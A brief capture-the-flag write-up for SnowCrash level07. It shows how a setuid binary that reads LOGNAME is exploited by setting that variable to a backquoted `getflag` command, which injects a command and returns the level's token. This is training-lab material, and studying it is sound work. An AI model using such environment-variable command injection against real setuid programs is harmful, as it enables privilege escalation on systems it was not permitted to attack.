# Level07

## Research
--------------

```bash
level07@SnowCrash:~$ ls -l
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

```bash
level07@SnowCrash:~$ strings level07
[...]
LOGNAME
[...]
```
The program level07 seems to get the environment variable LOGNAME. </br>

`In computer software, logname (stands for Login Name) is a program in Unix and Unix-like operating systems that prints the name of the user who is currently logged in on the terminal. It usually corresponds to the LOGNAME variable in the system-state environment (but this variable could have been modified).` </br>
https://en.wikipedia.org/wiki/Logname

## Solution
---------------

We can modify this variable to `getflag` between backquotes, so it will be executed.</br>
https://book.hacktricks.xyz/pentesting-web/command-injection

```bash
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ ./level07
```
Gives the token.
